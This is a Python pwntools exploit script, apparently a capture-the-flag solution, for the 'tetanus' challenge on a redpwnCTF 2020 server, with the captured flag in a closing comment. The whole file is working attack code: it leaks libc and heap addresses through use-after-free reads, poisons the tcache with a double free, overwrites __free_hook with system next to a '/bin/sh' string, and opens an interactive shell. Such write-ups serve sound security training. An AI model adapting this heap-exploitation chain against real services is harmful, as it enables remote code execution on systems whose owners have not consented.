from pwn import *

HOST = "2020.redpwnc.tf"
PORT = 31069

exe = ELF('tetanus')
libc = ELF('libc.so.6')
context(arch='amd64')
p = remote(HOST, PORT)
print()


def wait():
    p.recvrepeat(0.5)


def alloc(size):
    wait()
    p.sendline('1')
    wait()
    p.sendline(str(size))


def free(index):
    wait()
    p.sendline('2')
    wait()
    p.sendline(str(index))


def append(index, values):
    wait()
    p.sendline('5')
    wait()
    p.sendline(str(index))
    wait()
    p.sendline(str(len(values)))
    for v in values:
        wait()
        p.sendline(str(v))


def prepend(index, values):
    wait()
    p.sendline('4')
    wait()
    p.sendline(str(index))
    wait()
    p.sendline(str(len(values)))
    for v in values:
        wait()
        p.sendline(str(v))


def view(index, subindex):
    wait()
    p.sendline('6')
    wait()
    p.sendline(str(index))
    wait()
    p.sendline(str(subindex))


def edit(index, subindex, data):
    wait()
    p.sendline('3')
    wait()
    p.sendline(str(index))
    wait()
    p.sendline(str(subindex))
    wait()
    p.sendline(str(data))


log.info("leaking libc_base...")
alloc(0x80)  # 0
append(0, [0x4141414141414141] * 4)
free(0)
view(0, 0)
libcleak = int(p.recvline().split(b' ')[1]) - 0x1eabe0
libc.address = libcleak
log.info("libc_base leaked")
log.success("libc base --> %s\n\n" % hex(libcleak))

log.info("leaking heap_base...")
alloc(0x10)  # 1
append(1, [0x4141414141414141] * 2)
alloc(0x10)  # 2
append(2, [0x4141414141414141] * 2)
free(1)
free(2)
view(2, 0)
heapleak = int(p.recvline().split(b' ')[1]) - 0x2d10
log.info("heap_base leaked")
log.success("heap_base --> %s\n\n" % hex(heapleak))

edit(2, 1, 0)
free(2)
edit(2, 1, 0)
free(2)
alloc(0x10)  # 3
append(3, [libc.symbols['__free_hook'] - 8])
alloc(0x10)  # 4
alloc(0x10)  # 5
append(5, [0x68732f6e69622f, libc.symbols['system']])
p.interactive()

# FLAG --> flag{w0w_wh0da_thunk_th4t_unsafe_means_unsafe_ls!}
